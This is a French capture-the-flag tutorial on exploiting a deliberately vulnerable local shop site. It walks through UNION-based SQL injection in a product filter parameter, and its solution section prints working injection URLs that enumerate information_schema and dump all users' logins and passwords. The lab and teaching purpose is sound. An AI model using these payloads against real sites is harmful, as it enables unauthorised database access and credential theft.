# Injection SQL


## Synopsis

Avec vos talents de caméraman, vous avez décidé d'acheter une caméra compacte d'une marque toute récente : MoGo. En vous rendant sur leur site Internet, vous commencez à douter de la fiabilité de leur sécurité et voulez tester le site avant d'acheter en ligne votre caméra. Votre but : exploiter une vulnérabilité SQL pour récupérer des informations sensibles !


## Aide à la réalisation

Afin de rendre ce challenge plus pédagogique, vous avez le choix de le réaliser par vous-même (quelques indices sont à disposition au besoin) ou bien en suivant un guide pas à pas. Vous trouverez à la fin la solution détaillée.


### Indices

* Commencer par se connecter au site web...

* Identifier les différents points d'entrée possibles.

* Se rendre compte après avoir perdu du temps sur l'espace de connexion que la vulnérabilité se trouve dans la page *Produits*.

* Essayer d'injecter le paramètre *filter* dans l'URL.

* Si vous n'avez pas deviné les noms des champs et de la table à exploiter, utiliser la table *information_schema*.

* Si vous n'arrivez pas à exploiter correctement la vulnérabilité, utilisez une injection SQL basée sur un *UNION*


### Guide pas à pas

Rendez-vous sur votre machine hôte et lancez un navigateur. Dans la barre d'URL, tapez *localhost:4000*. Vous atterrissez sur le site de MoGo. Prenez le temps de visiter le site et de visualiser les différentes fonctionnalités qu'il offre.

Vous avez un espace de connexion et un espace permettant de lister les différents produits, selon certains critères donnés en entrée. Si vous voulez vous acharner sur l'espace de connexion, vous le pouvez mais ce n'est pas là qu'est orienté ce tutoriel.

Dans l'espace *Produits*, vous pouvez cliquer sur les différents filtres du tableau et voir les changements dans la barre d'URL que cela engendre. 

Les mots *filter* et *order* remarqués plus tôt laissent à penser qu'il y a une interaction avec la base de données utilisée pour afficher les différents produits. Vous avez maintenant le choix d'essayer d'injecter l'une des deux variables.

La variable à injecter est la variable *filter*. Cette variable permet de récupérer de nombreuses informations présentes dans la base de données. Essayez par vous-même d'obtenir ces informations.

Si vous n'avez pas réussi à deviner le nom de la table utilisée et/ou les noms des champs en question, alors il faut procéder autrement. 

Une requête SQL est relativement simple. Dans une base de données, on peut retrouver plusieurs tables (que l'on peut assimiler à des tableaux). Dans ces tables, il y a plusieurs champs (que l'on peut assimiler à des colonnes). Par exemple, dans la base de données *Aliments*, on peut retrouver les tables *Fruits*, *Fromages* et *Viandes*. Dans la table *Fruits*, on peut avoir les champs (booléens ou non) *Pépins*, *Couleur* et *Saison*. Dans notre cas, on se doute qu'il y a une table regroupant les identifiants et mots de passe des utilisateurs. Il va alors falloir faire une requête semblable à celle-ci.
```
SELECT identifiant, motdepasse, null FROM basededonnees.utilisateurs
```

En effet, il est important que le nombre de champs sélectionnés soit égal au nombre de colonnes du tableau, ici 3, sinon nous avons une erreur SQL (vous pouvez essayer par vous-même). Il s'agit maintenant de trouver les noms exactes de ces champs, table et base de données.

Par ailleurs, puisque nous réalisons une injection SQL, il faut qu'elle soit valide, c'est-à-dire qu'elle respecte une certaine syntaxe. En effet, le serveur SQL traite la requête sous la forme `SELECT ... FROM ... WHERE quelquechose='entrée_utilisateur'`. Il s'agit alors de bien faire correspondre les apostrophes afin que la requête soit valide. Vous remarquerez dans l'injection suivante la partie de la requête qui est statique (faite par le serveur) et dont les apostrophes se retrouvent avant l'*UNION* et tout à la fin, ainsi que la requête que vous avez à réaliser, séparée dans l'exemple suivant par **--> <--**.
```
SELECT ... FROM ... WHERE quelquechose=' --> ' UNION SELECT ... FROM ... WHERE ... <-- '
```

L'opérateur *UNION* permet de mettre bout à bout les résultats de plusieurs requêtes. On aura donc le résultat de la requête du serveur `SELECT ... FROM ... WHERE quelquechose=''`, qui ne retourne évidemment rien puisqu'à priori aucun produit n'a de champ laissé vide. Et d'autre part, on aura le résultat de la requête que vous avez injecté.

Dans un premier temps, il faut que vous retrouviez le nom de la base de données à utiliser. Pour cela, il faut s'aider de la table *schemata* provenant de la base de données *information_schema*, contenant les informations sur les bases de données du serveur *SQL*. Si vous ne trouvez pas le nom du champ à utiliser pour récupérer ce que vous cherchez, nous vous le donnons : *schema_name*.

Une fois le nom de la base de données retrouvé, il faut chercher le nom de la table à utiliser : de la même manière que précédemment, utilisez la table *tables* de la base de données *information_schema* dont les champs sont *table_schema* et *table_name*.

Ensuite, il faut trouver les noms des différents champs. Toujours de la même manière, servez-vous de la table *columns* de *information_schema* dont le champ est *column_name*.

Enfin, une fois la table et les champs retrouvés, il ne reste plus qu'à extraire les informations sensibles !

## Solution détaillée

Il faut tout d'abord lancer sur la machine hôte un navigateur et se connecter à *localhost:4000*. 

On arrive ensuite sur le site de MoGo, sur lequel on retrouve un espace de connexion et un espace dédié aux produits. L'espace de connexion n'est pas l'objectif de ce tutoriel et la vulnérabilité a été placée dans l'espace dédié aux produits. 

Dans cet espace, vous trouverez un tableau descriptif des différents produits. Ce tableau manipule la base de données afin d'afficher les produits sélectionnés grâce aux différents filtres applicables. On peut voir que deux paramètres sont utilisés et affichés dans l'URL (plus précisément dans une requête *POST*). Le paramètre injectable est le paramètre *filter*.

Maintenant que l'on a le point d'entrée de l'injection SQL, il ne reste plus qu'à trouver les noms de la base de données, de la table et des champs utilisés. Pour cela, vous pouvez soit essayer de deviner les noms en usant de logique, soit rechercher ces informations grâce à différentes injections. 


Une solution serait donc de faire les injections suivantes :

* Il s'agit dans un premier temps de trouver le nom de la base de données où pourrait se situer les informations sensibles. On affiche donc dans le tableau les différentes bases de données présentes sur le serveur *SQL*. On remarque une base de données appelée *mogodb*, c'est probablement celle-ci que l'on doit utiliser.
```
localhost:4000/products.php?filter=' UNION SELECT schema_name, null, null FROM information_schema.schemata where 'a'='a
```

* Il s'agit ensuite de trouver la table à exploiter dans cette base de données. On retrouve deux tables : la table *products* qui permet d'afficher les caméras et la table *users* qui permet aux utilisateurs de se connecter. C'est cette dernière qui nous intéresse.
```
localhost:4000/products.php?filter=' UNION SELECT table_schema, table_name, null FROM information_schema.tables where table_schema='mogodb
```

* Il faut maintenant trouver les champs à exploiter. On retrouve tout simplement les champs *login* et *pass* que l'on aurait pu trouver par déduction.
```
localhost:4000/products.php?filter=' UNION SELECT table_schema, table_name, column_name FROM information_schema.columns where table_schema='mogodb' AND table_name = 'users
```

* On a maintenant tout ce qu'il nous faut pour faire la dernière exploitation afin de récupérer les mots de passe de tous les utilisateurs.
```
localhost:4000/products.php?filter=' UNION SELECT login, pass, null FROM users where 'a' = 'a
```

On est maintenant en possession du mot de passe de la session *root*, bien joué !